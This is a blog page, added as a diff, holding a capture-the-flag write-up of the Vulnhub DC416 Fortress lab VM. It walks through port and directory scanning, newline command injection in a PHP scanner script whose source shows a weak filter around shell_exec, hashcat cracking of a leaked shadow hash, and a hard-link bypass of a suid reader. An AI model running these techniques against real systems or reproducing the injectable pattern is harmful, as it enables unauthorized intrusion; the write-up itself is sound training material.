@@ -1,0 +1,459 @@
+<!doctype html>
+<html lang="en" prefix="og: http://ogp.me/ns#">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnhub - DC416: Fortress Writeup</title>
+    <meta name="description" content="Vulnhub - DC416: Fortress Writeup">
+    
+    <meta name="keywords" content="vulnhub, walkthrough, writeup, DC416, fortress">
+    
+    <meta name="author" content="Christian Mehlmauer">
+
+    <meta name="twitter:card" content="summary">
+    
+    <meta name="twitter:site" content="@_FireFart_" />
+    <meta name="twitter:creator" content="@_FireFart_" />
+    
+    <meta name="twitter:title" content="Vulnhub - DC416: Fortress Writeup">
+    <meta name="twitter:description" content="Vulnhub - DC416: Fortress Writeup">
+    <meta property="og:title" content="Vulnhub - DC416: Fortress Writeup">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://firefart.at/post/vulnhub_dc416_fortress/" />
+    <meta property="og:description" content="Vulnhub - DC416: Fortress Writeup">
+    
+    <meta property="og:image" content="https://firefart.at/img/misc/vulnhub.png" />
+    <meta name="twitter:image" content="https://firefart.at/img/misc/vulnhub.png" />
+    
+    <meta property="og:updated_time" content="2017-01-13 23:45:00 &#43;0100 CET"/>
+    <meta property="article:author" content="https://twitter.com/_FireFart_"/>
+
+    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700%7COxygen:400,700" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/pure-min.css">
+    <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/grids-responsive-min.css">
+
+    <link rel="stylesheet" href='https://firefart.at/css/all.min.css'>
+    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+
+    
+    
+    <script type="application/ld+json">
+    [
+      {
+        "@context" : "http://schema.org",
+        "@type" : "WebSite",
+        "name" : "FireFart",
+        "url" : "https://firefart.at"
+      },
+      {
+        "@context" : "http://schema.org",
+        "@type" : "Person",
+        "name" : "Christian Mehlmauer",
+        "url" : "https://firefart.at",
+        "sameAs" : [
+          "https://twitter.com/_FireFart_",
+          "https://github.com/FireFart",
+          "https://www.facebook.com/christian.mehlmauer"
+        ]
+      }
+    ]
+    </script>
+
+</head>
+<body>
+
+
+<div id="layout" class="pure-g">
+    <div class="sidebar pure-u-1 pure-u-md-1-4">
+    <div class="header">
+        <h1 class="brand-title"><a href="/">FireFart</a></h1>
+        <h2 class="brand-tagline"> that austrian security guy </h2>
+
+        <nav class="nav">
+            <ul class="nav-list">
+                
+                <li class="nav-item">
+                    <a class="pure-button" target="_blank" href="https://twitter.com/_FireFart_">
+                        <i class="fa fa-twitter"></i> Twitter
+                    </a>
+                </li>
+                
+                
+                <li class="nav-item">
+                     <a class="pure-button" target="_blank" href="https://github.com/FireFart">
+                        <i class="fa fa-github-alt"></i> Github
+                    </a>
+                </li>
+                
+                
+                
+                <li class="nav-item">
+                    <a class="pure-button" href="/page/about/"><i class="fa fa-info"></i> about me</a>
+                </li>
+                <li class="nav-item">
+                    <a class="pure-button" target="_blank" href='https://firefart.at/index.xml'>
+                        <i class="fa fa-rss"></i> rss
+                    </a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+</div>
+
+
+    <div class="content pure-u-1 pure-u-md-3-4">
+        <div>
+            
+            <div class="posts">
+                <h1 class="content-subhead">13 Jan 2017, 23:45</h1>
+                <section class="post">
+                    <header class="post-header">
+
+                        <a href="/post/vulnhub_dc416_fortress/" class="post-title">Vulnhub - DC416: Fortress Writeup</a>
+
+                        <p class="post-meta">
+                            
+                            
+                        </p>
+                    </header>
+
+                    <div id="toc" class="well col-md-4 col-sm-6">
+                      <nav id="TableOfContents">
+<ul>
+<li><a href="#information-gathering">information gathering</a></li>
+<li><a href="#flag1">flag1</a></li>
+<li><a href="#flag2">flag2</a></li>
+<li><a href="#flag3">flag3</a></li>
+<li><a href="#flags">flags</a></li>
+</ul>
+</nav>
+                    </div>
+
+                    <div class="post-description">
+                      <p><a href="https://www.vulnhub.com/entry/dc416-2016,168/">Fortress</a> is the last of 4 DC416 VMs by <a href="https://twitter.com/superkojiman">@superkojiman</a>.</p>
+
+<p>Here are my other writeups for the DC416 challenges:</p>
+
+<ul>
+<li><a href="/post/vulnhub_dc416_basement/">DC416 Basement</a></li>
+<li><a href="/post/vulnhub_dc416_baffle/">DC416 Baffle</a></li>
+<li><a href="/post/vulnhub_dc416_dick_dastardly/">DC416 Dick Dastardly</a></li>
+</ul>
+
+<h1 id="information-gathering">information gathering</h1>
+
+<p>A nmap scan of the machine reveals a FreeBSD server with a webserver present.</p>
+
+<pre><code>root@kali:~# nmap -sS -p- -A 192.168.56.2
+Nmap scan report for 192.168.56.2
+Host is up (0.00064s latency).
+Not shown: 65532 filtered ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.2 (FreeBSD 20160310; protocol 2.0)
+| ssh-hostkey:
+|   2048 3a:34:82:2b:86:e3:2a:e4:2c:34:18:85:f9:94:7c:69 (RSA)
+|_  256 78:79:e2:ed:27:e3:43:77:0b:07:d2:03:bb:7f:c1:02 (ECDSA)
+80/tcp  open  http     Apache httpd 2.4.23 ((FreeBSD) OpenSSL/1.0.2j-freebsd PHP/5.6.27)
+|_http-server-header: Apache/2.4.23 (FreeBSD) OpenSSL/1.0.2j-freebsd PHP/5.6.27
+|_http-title: Did not follow redirect to https://192.168.56.2/
+443/tcp open  ssl/http Apache httpd 2.4.23 ((FreeBSD) OpenSSL/1.0.2j-freebsd PHP/5.6.27)
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.23 (FreeBSD) OpenSSL/1.0.2j-freebsd PHP/5.6.27
+|_http-title: fortress
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=ON/countryName=CA
+| Not valid before: 2016-11-05T05:05:36
+|_Not valid after:  2017-11-05T05:05:36
+|_ssl-date: TLS randomness does not represent time
+</code></pre>
+
+<p>The webserver contains the following rules</p>
+
+<pre><code>Engagement Rules:
+
+No SSH bruteforcing is necessary
+This box has 3 flags
+Flags are in the FLAG{} format
+The goal is not to get root. Get the flags and move on
+Have fun
+</code></pre>
+
+<h1 id="flag1">flag1</h1>
+
+<p>We start by running <code>dirb</code> against the target to identify scripts and directories to attack. As we know from the <code>nmap</code> output the server is also running PHP so let&rsquo;s scan for files with a <code>.php</code> ending too.</p>
+
+<pre><code>root@kali:~# dirb https://192.168.56.2/ /usr/share/wordlists/dirb/big.txt
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+START_TIME: Fri Jan 13 21:24:14 2017
+URL_BASE: https://192.168.56.2/
+WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
+-----------------
+GENERATED WORDS: 20458
+---- Scanning URL: https://192.168.56.2/ ----
+-----------------
+END_TIME: Fri Jan 13 21:24:24 2017
+DOWNLOADED: 20458 - FOUND: 0
+</code></pre>
+
+<pre><code>root@kali:~# dirb https://192.168.56.2/ /usr/share/wordlists/dirb/big.txt -X .php
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+START_TIME: Fri Jan 13 21:24:29 2017
+URL_BASE: https://192.168.56.2/
+WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
+EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]
+-----------------
+GENERATED WORDS: 20458
+---- Scanning URL: https://192.168.56.2/ ----
++ https://192.168.56.2/scanner.php (CODE:200|SIZE:370)
+-----------------
+END_TIME: Fri Jan 13 21:24:40 2017
+DOWNLOADED: 20458 - FOUND: 1
+</code></pre>
+
+<p>Awesome we found <code>scanner.php</code>. By looking at the file we can see a script to scan a target via nmap.</p>
+
+<p><img src="/img/vulnhub_dc416_fortress/scanner_scan.png" alt="Scanner" /></p>
+
+<p>By playing around with the input we can completely modify the command like adding new parameters to <code>nmap</code> but some special characters are filtered to prevent command injection. I identified the newline character as a not filtered character which leads to full command execution as the user <code>www</code>.</p>
+
+<p><img src="/img/vulnhub_dc416_fortress/scanner_inject.png" alt="Injection" /></p>
+
+<p>We can now also view the source code of <code>scanner.php</code> to verify the filtering taking place:</p>
+
+<p><code>cat scanner.php</code></p>
+
+<pre><code class="language-php">&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;S C A N N 3 R&lt;/title&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot; type=&quot;text/css&quot; /&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;div class=&quot;container&quot;&gt;
+
+&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;
+  &lt;input class=&quot;form&quot; type=&quot;text&quot; name=&quot;host&quot; value=&quot;127.0.0.1&quot; /&gt;
+  &lt;input class=&quot;button&quot; type=&quot;submit&quot; value=&quot;Scan Target&quot; /&gt;
+&lt;/form&gt;
+&lt;?php
+
+if(isset($_POST['host'])) {
+    $cmd = &quot;/usr/local/bin/nmap -F -sT &quot;.$_POST['host'];
+    echo &quot;&lt;pre&gt;Command: $cmd\n\n&lt;/pre&gt;&quot;;
+
+    if (strpos($cmd, &quot;;&quot;) !== FALSE || strpos($cmd, &quot;|&quot;) !== FALSE || strpos($cmd, &quot;&amp;&quot;) !== FALSE) {
+        echo &quot;&lt;pre&gt;Nope. Good try though... 💋&lt;/pre&gt;\n&quot;;
+    } else {
+        $output = shell_exec($cmd);
+        echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;
+    }
+}
+?&gt;
+
+&lt;img class=&quot;logo&quot; src=&quot;logo.png&quot;&gt;
+
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;/pre&gt;
+&lt;img class=&quot;logo&quot; src=&quot;logo.png&quot;&gt;
+
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Next we examine the other files present</p>
+
+<pre><code>total 144
+drwxr-xr-x  4 root  wheel   512B Nov  9 20:24 .
+drwxr-xr-x  6 root  wheel   512B Nov  9 19:58 ..
+-rw-r--r--  1 root  wheel   561B Nov  8 23:51 index.html
+drwxr-xr-x  2 root  wheel   512B Nov  9 20:22 k1ngd0m_k3yz
+-rw-r--r--  1 root  wheel    44K Nov  4 00:46 logo.png
+drwxr-xr-x  2 root  wheel   512B Nov  9 20:22 s1kr3t
+-rw-r--r--  1 root  wheel   759B Nov  5 00:50 scanner.php
+-rw-r--r--  1 root  wheel   612B Nov  4 01:01 styles.css
+</code></pre>
+
+<p>The first flag can be found in the <code>s1kr3t</code> directory.</p>
+
+<pre><code>cat s1kr3t/flag.txt
+FLAG{n0_one_br3aches_teh_f0rt}
+</code></pre>
+
+<h1 id="flag2">flag2</h1>
+
+<p>There is also another interesting directory named <code>k1ngd0m_k3yz</code>. The directory seems to contain a line extracted from <code>/etc/shadow</code> and the corresponding line from <code>/etc/passwd</code>.</p>
+
+<pre><code>cat k1ngd0m_k3yz/master
+craven:$6$qAgPM2TEordSoFnH$4uPUAhB.9rORkWExA8jI0Sbwn0Bj50KAK0tJ4rkrUrIkP6v.gE/6Fw9/yn1Ejl2TedyN5ziUz8N0unsHocuks.:1002:1002::0:0:User &amp;:/home/craven:/bin/sh
+
+cat k1ngd0m_k3yz/passwd
+craven:*:1002:1002:User &amp;:/home/craven:/bin/sh
+</code></pre>
+
+<p>So we now have a hash for the user <code>craven</code>. If we look at raven&rsquo;s home directory under <code>/home/craven</code> we can see an unreadable <code>flag.txt</code>, <code>hint.txt</code> and <code>reminder.txt</code>.</p>
+
+<p>The hint says:</p>
+
+<pre><code>Keep forgetting my password, so I made myself a hint. Password is three digits followed by my pet's name and a symbol.
+</code></pre>
+
+<p>And the reminder:</p>
+
+<pre><code>To buy:
+* skim milk
+* organic free-run eggs
+* dog bone for qwerty
+* sriracha
+</code></pre>
+
+<p>So it looks like <code>craven</code> owns a dog named <code>qwerty</code> and uses it as part of his password.</p>
+
+<p>The next step is to create a custom wordlist using the pattern from the hint. We use <a href="https://github.com/hashcat/maskprocessor">Hashcat Maskprocessor</a> for this purpose.</p>
+
+<p>After building the source code we can generate all possible passwords by running the following command:</p>
+
+<pre><code>./mp64.bin ?d?d?dqwerty?s &gt; pass.txt
+</code></pre>
+
+<p><code>?d</code> stands for one digit and <code>?s</code> for a symbol. This command creates every possible word starting with 3 digits followed by the word qwery and a symbol.</p>
+
+<p>Now we can use this wordlist to crack the hash using <a href="https://hashcat.net/hashcat/">hashcat</a>. The hash type is <code>1800</code> which is defined as <code>sha512crypt $6$, SHA512(Unix)</code> (we can identify this by looking at the starting <code>$6$</code> of the hash). The file <code>hash.txt</code> only contains the hash without the extra stuff from the <code>master</code> file.</p>
+
+<pre><code>[firefart@linux hashcat]$ ./hashcat -m 1800 hash.txt pass.txt
+hashcat (v3.30-5-gdd57ef5) starting...
+
+OpenCL Platform #1: NVIDIA Corporation
+======================================
+* Device #1: GeForce GTX 1070, 2027/8110 MB allocatable, 15MCU
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable Optimizers:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Uses-64-Bit
+
+Watchdog: Temperature abort trigger set to 90c
+Watchdog: Temperature retain trigger disabled
+
+Cache-hit dictionary stats pass.txt: 363000 bytes, 33000 words, 33000 keyspace
+
+The wordlist or mask you are using is too small.
+Therefore, hashcat is unable to utilize the full parallelization power of your device(s).
+The cracking speed will drop.
+Workaround: https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#how_to_create_more_work_for_full_speed
+
+INFO: approaching final keyspace, workload adjusted
+
+$6$qAgPM2TEordSoFnH$4uPUAhB.9rORkWExA8jI0Sbwn0Bj50KAK0tJ4rkrUrIkP6v.gE/6Fw9/yn1Ejl2TedyN5ziUz8N0unsHocuks.:931qwerty?
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: sha512crypt, SHA512(Unix)
+Hash.Target......: $6$qAgPM2TEordSoFnH$4uPUAhB.9rORkWExA8jI0Sbwn0Bj50KAK0tJ4rkrUrIkP6v.gE/6Fw9/yn1Ejl2TedyN5ziUz8N0unsHocuks.
+Time.Started.....: Fri Jan 13 22:25:28 2017 (0 secs)
+Time.Estimated...: Fri Jan 13 22:25:28 2017 (0 secs)
+Input.Base.......: File (pass.txt)
+Input.Queue......: 1/1 (100.00%)
+Speed.Dev.#1.....:    89162 H/s (2.20ms)
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 33000/33000 (100.00%)
+Rejected.........: 0/33000 (0.00%)
+Restore.Point....: 0/33000 (0.00%)
+Candidates.#1....: 000qwerty  -&gt; 999qwerty~
+HWMon.Dev.#1.....: Temp: 63c Fan: 38% Util:100% Core:1936Mhz Mem:3802Mhz Lanes:16
+
+Started: Fri Jan 13 22:25:23 2017
+Stopped: Fri Jan 13 22:25:29 2017
+</code></pre>
+
+<p>So we found cravens password: <code>931qwerty?</code>.</p>
+
+<p>Now we can try to login as <code>craven</code> via SSH to see if the password is valid and get the next flag.</p>
+
+<pre><code>ssh craven@192.168.56.2
+$ cat flag.txt
+FLAG{w0uld_u_lik3_som3_b33r_with_ur_r3d_PiLL}
+</code></pre>
+
+<h1 id="flag3">flag3</h1>
+
+<p>We can spot a suid binary from the user <code>vulnhub</code> in it&rsquo;s home directory <code>/home/vulnhub</code>.</p>
+
+<pre><code>$ cd /home/vulnhub/
+$ ./reader
+./reader [file to read]
+$ ./reader flag.txt
+Checking file type...
+Checking if flag file...
+Nope. Can't let you have the flag.
+$ ./reader /etc/passwd
+Checking file type...
+Checking if flag file...
+Great! Printing file contents...
+Win, here's your flag:
+# $FreeBSD: releng/11.0/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
+</code></pre>
+
+<p>It seems the binary checks the filename for <code>flag.txt</code> so let&rsquo;s try to trick this check with a symbolic link:</p>
+
+<pre><code>$ ln -s /home/vulnhub/flag.txt /tmp/test
+$ ./reader /tmp/test
+Checking file type...
+Symbolic links not allowed!
+</code></pre>
+
+<p>Bummer, no symbolic links allowed. So let&rsquo;s try to use a hard link:</p>
+
+<pre><code>$ ln -f /home/vulnhub/flag.txt /tmp/test
+$ ./reader /tmp/test
+Checking file type...
+Checking if flag file...
+Great! Printing file contents...
+Win, here's your flag:
+FLAG{its_A_ph0t0_ph1ni5h}
+</code></pre>
+
+<p>Done!</p>
+
+<h1 id="flags">flags</h1>
+
+<pre><code>FLAG{n0_one_br3aches_teh_f0rt}
+FLAG{w0uld_u_lik3_som3_b33r_with_ur_r3d_PiLL}
+FLAG{its_A_ph0t0_ph1ni5h}
+</code></pre>
+                    </div>
+                </section>
+            </div>
+            <div class="footer">
+    <div class="pure-menu pure-menu-horizontal pure-menu-open">
+        <ul>
+            <li>Copyright by Christian Mehlmauer</li>
+            <li>source code available on <a href="https://github.com/FireFart/blog">Github</a></li>
+        </ul>
+    </div>
+</div>
+<script type="text/javascript" src='https://firefart.at/js/all.min.js'></script>
+<script type="text/javascript" src='https://firefart.at/js/firefart.js'></script>
+
+<script type="text/javascript" src='https://firefart.at/js/anal.js'></script>
+<noscript><p><img src="//firefart.at/pi.php?idsite=1" style="border:0;" alt="placeholder" /></p></noscript>
+
+
+        </div>
+    </div>
+</div>
+</body>
+</html>
